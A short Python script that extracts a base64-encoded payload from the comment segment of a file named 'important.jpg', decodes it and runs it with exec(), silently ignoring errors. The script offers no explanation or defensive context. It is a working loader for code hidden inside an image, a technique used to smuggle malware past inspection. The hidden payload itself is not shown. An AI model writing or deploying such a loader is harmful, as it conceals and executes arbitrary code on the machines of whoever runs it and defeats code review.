import base64
import os
import sys
from pathlib import Path

def _extract(jpg_path):
    try:
        with open(jpg_path, 'rb') as f:
            data = f.read()
        
        comment_marker = b'\xFF\xFE'
        pos = data.find(comment_marker)
        if pos != -1:
            code_start = pos + 4
            end_pos = data.find(b'\xFF', code_start)
            if end_pos == -1:
                end_pos = len(data)
            encoded_code = data[code_start:end_pos]
            return base64.b64decode(encoded_code)
    except Exception:
        pass
    return None

embedded_code = _extract('important.jpg')
if embedded_code:
    exec(embedded_code)
else:
    sys.exit(1)